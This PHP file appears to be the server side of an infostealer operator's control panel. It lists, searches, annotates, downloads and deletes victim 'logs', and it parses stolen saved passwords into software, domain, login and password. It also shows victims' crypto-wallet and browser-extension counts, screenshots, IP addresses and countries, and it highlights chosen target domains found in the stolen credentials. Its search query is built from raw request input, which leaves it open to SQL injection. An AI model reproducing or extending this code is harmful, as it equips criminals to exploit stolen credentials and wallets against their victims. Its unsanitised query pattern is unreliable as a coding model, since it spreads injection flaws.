	<?php

	require '../../db.php';
	//////////////////////Functions switcher

	switch (trim($_POST['func'])) {
		case "logssearch":
			logssearch();
			break;
		case "logssearchload":
			logssearchload();
			break;
		case "savenote":
			savenote();
			break;
		case "deletelog":
			deletelog();
			break;
		case "deletelogs":
			deletelogs();
			break;
		case "modalpwds":
			modalpwds();
			break;
	}

	//////////////////////Logs search sql generator

	function logssearch()
	{


		$page = intval($_POST['page']);
		$prew = (intval($page) - 1);
		$mult = 20;

		$rows = logssearchdb();		

		$logs = array_slice(array_reverse($rows, true), ($prew * $mult), $mult);
		//////////////////////HTML Generator


		$html = "";
		
		
		$html .= '<div class="col-12 d-flex justify-content-end">
                            <ul class="pagination pagination-sm  mt-4" style="cursor: pointer;">';
								if ($prew !=0)
								{
									$html .= '<li class="page-item"><a id="1" class="btn-page page-link" >First</a></li>';								
									if ($prew > 1)
									{
										$html .= '<li class="page-item"><a id="'.($page - 2).'" class="btn-page page-link" >'.($page - 2).'</a></li>';
									}
									$html .= '<li class="page-item"><a id="'.($page -1).'" class="btn-page page-link">'.($page -1).'</a></li>';
								}
								$html .= '<li class="page-item active"><a id="'.$page.'" class="btn-page page-link">'.$page.'</a></li>';
								if ($page < (intdiv(count($rows),$mult)+1))
								{
									$html .= '<li class="page-item"><a id="'.($page + 1).'" class="btn-page page-link">'.($page + 1).'</a></li>';
									if ($page < (intdiv(count($rows),$mult)))
									{
										$html .= '<li class="page-item"><a id="'.($page + 2).'" class="btn-page page-link">'.($page + 2).'</a></li>';
										$html .= '<li class="page-item"><a id="'.(intdiv(count($rows),$mult)+1).'" class="btn-page page-link">Last</a></li>';
									}
								}

                            $html .= '</ul>
                        </div>

                        <table class="table table-bordered dt-responsive nowrap" style="border-collapse: collapse; border-spacing: 0; width: 100%;">
                            <thead>
                                <tr>
                                    <th style="width: 40px;">Id</th>
                                    <th style="width: 30px;">
									
									<div class="custom-control custom-checkbox">
                                            <input type="checkbox" class="btn-select-all custom-control-input" id="customChecks" data-parsley-multiple="groups" data-parsley-mincheck="2">
                                            <label class="custom-control-label" for="customChecks"></label>
                                        </div>
									</th>
                                    <th style="width: 200px;">Comment</th>
                                    <th style="width: 240px;">Data</th>
                                    <th style="width: 180px;">Marker</th>
                                    <th>IP</th>
									<th >Screenshot</th>
                                    <th style="width: 200px;">Actions</th>
                                    <th style="width: 250px;">Date</th>
                                    
                                </tr>
                            </thead>


                            <tbody>';
		
		
			foreach($logs as $log) {
			$html .= '<tr id = ' . $log["id"] . '>
                                    <td class="font-weight-bolder font-size-lg mb-0">' . $log["id"] . '</td>
                                    <td>
                                        <div class="custom-control custom-checkbox">
                                            <input type="checkbox" class="check-rows custom-control-input" id="customCheck' . $log["id"] . '" file_name="'.$log["path"].'" link_to_download="'.$GLOBALS['logspath'].'/'.$log["path"].'" data-parsley-multiple="groups" data-parsley-mincheck="2">
                                            <label class="custom-control-label" for="customCheck' . $log["id"] . '"></label>
                                        </div>
                                    </td>
                                    <td>
                                        <div class="input-group">
                                            <textarea class="form-control" rows="1" style="margin-top: 0px; margin-bottom: 0px; width: 80px;">'.$log["note"].'</textarea>
                                            <span class="">
												<button class="btn_saveNote btn btn-outline-success btn-sm" type="button">
													<svg width="24" height="24" 
														viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2"
														stroke-linecap="round" stroke-linejoin="round" class="feather feather-save" 
														style="width:20px;">
															<path d="M19 21H5a2 2 0 0 1-2-2V5a2 2 0 0 1 2-2h11l5 5v11a2 2 0 0 1-2 2z"></path>
															<polyline points="17 21 17 13 7 13 7 21"></polyline>
															<polyline points="7 3 7 8 15 8"></polyline>
													</svg>
												</button>
                                            </span>
                                        </div>
                                    </td>
                                    <td class="text-center">
									
                                        <button  class="btn btn-sm btn-outline-warning" style="height: 31px;">
                                            <b>&#8383;</b>';
											if ($log["count_crpt"]>0)
											{
												$html .= $log["count_crpt"];
											}
											else
											{
												$html .= '0';
											}
												
                                        $html .= '</button>
										<button  class="btn btn-sm btn-outline-warning" style="height: 31px;">
                                            <b>🧩</b>';
											if ($log["count_plugins"]>0)
											{
												$html .= $log["count_plugins"];
											}
											else
											{
												$html .= '0';
											}
											$html .= '</button>
											<button type="button" class="btn btn-modalcl btn-sm btn-outline-primary" style="height: 31px;" >
										<svg xmlns="http://www.w3.org/2000/svg" width="24" height="24" 
											viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2"
											stroke-linecap="round" stroke-linejoin="round" class="feather feather-key" 
											style="width:10px;">
												<path d="M21 2l-2 2m-7.61 7.61a5.5 5.5 0 1 1-7.778 7.778 5.5 5.5 0 0 1 7.777-7.777zm0 0L15.5 7.5m0 0l3 3L22 7l-3-3m-3.5 3.5L19 4"></path>
										</svg> 
										'.$log["count_pwds"].'
									</button>
                                        <div class="modal fade" id="myModal" tabindex="-1" role="dialog" aria-labelledby="my-modal-'.$log["id"].'" aria-hidden="true">
                                            <div class="modal-dialog modal-xl" role="document">
                                                <div class="modal-content">
                                                    <div class="modal-header">
                                                        <h6 class="modal-title m-0" id="my-modal-'.$log["id"].'">Saved password</h6>
                                                        <button type="button" class="close "  data-dismiss="modal" aria-label="Close">
                                                            <span aria-hidden="true"><i data-feather="arrow-right"></i></span>
                                                        </button>
                                                    </div>
                                                    <!--end modal-header-->
                                                    <div class="modal-body">

                                                        <div class="table-responsive">
                                                            <table class="table table-hover mb-0">
                                                                <thead>
                                                                    <tr>
                                                                        <th>Soft</th>
                                                                        <th>Domain</th>
                                                                        <th>Login</th>
                                                                        <th>Password</th>
                                                                    </tr>
                                                                </thead>
                                                                <tbody id="onetwo">
                                                                    
                                                                </tbody>
                                                            </table>
                                                            <!--end /table-->
                                                        </div>
                                                    </div>
                                                    <!--end modal-body-->
                                                    <div class="modal-footer">
                                                        <button type="button" class="btn btn-secondary btn-sm" data-dismiss="modal">Close</button>
                                                    </div>
                                                    <!--end modal-footer-->
                                                </div>
                                                <!--end modal-content-->
                                            </div>
                                            <!--end modal-dialog-->
                                        </div>
                                        <!--end modal-->

                                    </td>
                                    <td>';
			$markers = R::find('markerrule', 'is_active = ?', ["1"]);

			$passwords = nl2br($log["text_pwds"]);

			foreach (array_reverse($markers, true) as $marker) {
				$_markers = explode(',', $marker["marker"]);
				foreach ($_markers as $_marker)
				{
					$pos = stripos($passwords, $_marker);

					if ($pos !== false) 
					{
						$html .= '<span style="color: ' . $marker["color"] . '">' . $_marker . ' </span>';
					}
				}
				
			}

			$html .= '</td>
                                    <td >
										<div class="font-weight-bolder font-size-lg mb-0">'.$log["ip"].'</div>
										<div class="font-weight-bold text-muted d-flex align-items-center">Code: <span class="mx-2">
											<img src="assets/images/flags/'.strtolower($log["country"]).'.png" alt="" />
										</span>'.$log["country"].'</div>
									</td>
                                    <td class="text-center">
										<div style="width: 100px; display: block; margin-left: auto; margin-right: auto; cursor: pointer;" class="btn-modalscr card card-custom  mb-5 mb-lg-0" path="'.$GLOBALS['logspath'].'/'.$log["path"].'">
											<img src="view.php?path='.$GLOBALS['logspath'].'/'.$log["path"].'" width="100%" >			
										</div>
									</td>
									<td class="text-center">
                                        <a href="./'.$GLOBALS['logspath'].'/'.$log["path"].'" type="button" class=" btn btn-sm btn-outline-info waves-effect waves-light  mr-2">download</a>
                                        <button type="button" class="btn-deleteLog btn btn-sm btn-outline-danger waves-effect waves-light">delete</button>
                                    </td>
								<td>
									<div class="font-weight-bolder text-dark mb-0">';
									$startTime = new Datetime($log["add_date"]);
          $endTime = new DateTime();
          
          $diff = date_diff($endTime, $startTime);
          if($diff->format('%y') > 0) $html .= $diff->format('%m')."y ";
          if($diff->format('%m') > 0) $html .= $diff->format('%m')."m ";
          if($diff->format('%d') > 0) $html .= $diff->format('%d')."d ";
          if($diff->format('%H') > 0) $html .= $diff->format('%H')."h ";
          if($diff->format('%i') > 0) $html .= $diff->format('%i')."m ";
          if($diff->format('%s') > 0) $html .= $diff->format('%s')."s";
										$html .= ' ago</div>
									<div class="font-weight-bolder text-muted mb-0">'.$log["add_date"].'</div>
								</td>
								</tr>
</tr>';
		}
		$html .= '</tbody>
				</table>';
		
		$html .= '<div class="col-12 d-flex justify-content-end">
                            <ul class="pagination pagination-sm  mt-4" style="cursor: pointer;">';
								if ($prew !=0)
								{
									$html .= '<li class="page-item"><a id="1" class="btn-page page-link" >First</a></li>';								
									if ($prew > 1)
									{
										$html .= '<li class="page-item"><a id="'.($page - 2).'" class="btn-page page-link" >'.($page - 2).'</a></li>';
									}
									$html .= '<li class="page-item"><a id="'.($page -1).'" class="btn-page page-link">'.($page -1).'</a></li>';
								}
								$html .= '<li class="page-item active"><a id="'.$page.'" class="btn-page page-link">'.$page.'</a></li>';
								if ($page < (intdiv(count($rows),$mult)+1))
								{
									$html .= '<li class="page-item"><a id="'.($page + 1).'" class="btn-page page-link">'.($page + 1).'</a></li>';
									$html .= '<li class="page-item"><a id="'.($page + 2).'" class="btn-page page-link">'.($page + 2).'</a></li>';
									$html .= '<li class="page-item"><a id="'.(intdiv(count($rows),$mult)+1).'" class="btn-page page-link">Last</a></li>';
								}

                            $html .= '</ul>
                        </div>';

		

		echo json_encode($html);
	}
	
	//////////////////////logssearch load
	
	function logssearchload()
	{
		$logs = logssearchdb();
		$mass = array();
		foreach($logs as $log)
		{
			$mass[$log["path"]] = $GLOBALS['logspath'].'/'.$log["path"];			
		}
		echo json_encode($mass);
	}
	
	//////////////////////logssearch in db
	
	function logssearchdb()
	{

		$where = "";
		if (!empty($_POST['id'])) $where		.= " AND UPPER(id) LIKE UPPER('%" . trim($_POST['id'] . "%')");
		if (!empty($_POST['ip'])) $where		.= " AND ip LIKE '%" . trim($_POST['ip']) . "%'";
		if (!empty($_POST['country']))
		{
			$sqlcountry = " AND (UPPER(country) LIKE UPPER('test'))";
			foreach ($_POST['country'] as $country)
			{
				$sqlcountry .= " OR (UPPER(country) LIKE UPPER('%". $country."%'))";
			}
	
			$where .= $sqlcountry;
		}
		if (!empty($_POST['note'])) $where		.= " AND UPPER(note) LIKE UPPER('%" . trim($_POST['note'] . "%')");
		if (!empty($_POST['pwd'])) $where		.= " AND UPPER(text_pwds) LIKE UPPER('%" . trim($_POST['pwd'] . "%')");
		if (!empty($_POST['system'])) $where	.= " AND UPPER(text_sys) LIKE UPPER('%" . trim($_POST['system'] . "%')");
		if (!empty($_POST['date'])) {
			$dates = explode(" - ", $_POST['date']);
			$date1 = date("Y-m-d H:i:s", strtotime($dates[0] . " 00:00:00"));
			$date2 = date("Y-m-d H:i:s", strtotime($dates[1] . " 23:59:59"));
			$where .= " AND add_date BETWEEN '" . $date1 . "' AND '" . $date2 . "'";
		}
		if ($_POST['empty'] == 'true') $where	.= " AND count_pwds>0";
		if ($_POST['crpt'] == 'true') $where	.= " AND count_crpt>0";
		if ($_POST['exts'] == 'true') $where	.= " AND count_plugins>0";
		if ($_POST['unique'] == 'true') $where	.= " AND dublicate = 0";

		$page = intval($_POST['page']);
		$prew = (intval($page) - 1);
		$mult = 20;

		$sql = "SELECT * FROM log WHERE 1=1" . ($where ? $where : "");

		$rows = R::getAll($sql);

		return $rows;

	}

	//////////////////////Save note

	function savenote()
	{
		$log = R::load('log', $_POST['id']);
		$log->note = trim($_POST['note']);
		R::store($log);
		echo 'note add';
	}

	//////////////////////Delete log

	function deletelog()
	{
		$log = R::load('log', $_POST['id']);
		R::trash($log);
		echo $result = "deleted";
	}

	//////////////////////Delete logs

	function deletelogs()
	{
		foreach ($_POST['ids'] as $key => $id) {
			$log = R::load('log', $id);
			R::trash($log);
		}
		echo $result = json_encode($_POST['ids']);
	}

	//////////////////////Generate modal with pwds

	function modalpwds()
	{
		$log = R::load('log', $_POST['id']);
		$pwds = $log['text_pwds'];
		$working = explode("\n", $pwds);
		$i = 0;
		$mass = array();
		foreach ($working as $line) {
			$row = substr($line, 0, 4);
			$param = substr($line, 6);
						
			switch ($row) {
				case "SOFT":
					$mass[$i] = array("SOFT" => $param);
					break;

				// case "PROF":
				// 	$mass[$i] += array("PROF" => $param);
				// 	break;

				case "HOST":
					$mass[$i] += array("HOST" => $param);
					break;

				case "USER":
					$mass[$i] += array("USER" => $param);
					break;

				case "PASS":
					$mass[$i] += array("PASS" => $param);
					break;
				case "":
					$i++;
					break;
			}
			
			
		}
		echo json_encode($mass);
	}




	?>